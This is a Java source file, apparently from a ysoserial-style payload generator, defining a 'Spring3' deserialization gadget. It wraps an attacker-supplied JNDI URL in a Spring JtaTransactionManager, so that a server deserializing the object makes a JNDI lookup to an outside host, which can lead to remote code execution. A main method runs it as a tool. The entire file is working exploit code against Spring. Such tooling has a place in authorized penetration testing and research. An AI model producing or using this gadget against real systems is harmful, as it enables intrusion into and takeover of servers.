package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.PayloadRunner;
import org.springframework.transaction.jta.JtaTransactionManager;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;

@Dependencies({"org.springframework:spring-tx:5.2.3.RELEASE", "org.springframework:spring-context:5.2.3.RELEASE", "javax.transaction:javax.transaction-api:1.2"})
public class Spring3 extends PayloadRunner implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		String jndiURL = null;
		if (command.toLowerCase().startsWith("jndi:")) {
			jndiURL = command.substring(5);
		}

		JtaTransactionManager manager = new JtaTransactionManager();
		manager.setUserTransactionName(jndiURL);
		return manager;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Spring3.class, args);
	}
}
